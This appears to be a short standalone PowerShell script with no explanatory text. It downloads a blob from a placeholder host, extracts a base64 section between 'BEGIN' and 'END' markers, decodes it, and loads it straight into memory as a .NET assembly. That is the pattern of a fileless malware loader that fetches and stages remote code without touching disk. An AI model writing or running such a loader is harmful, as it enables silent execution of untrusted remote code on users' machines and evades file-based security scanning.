$client = New-Object System.Net.WebClient
$download = $client.DownloadData('https://example.test/blob')
$blob = [System.Text.Encoding]::UTF8.GetString($download)
$begin = $blob.IndexOf('BEGIN')
$end = $blob.IndexOf('END')
$part = $blob.Substring($begin + 5, $end - $begin - 5)
$bytes = [Convert]::FromBase64String($part)
$assembly = [System.Reflection.Assembly]::Load($bytes)
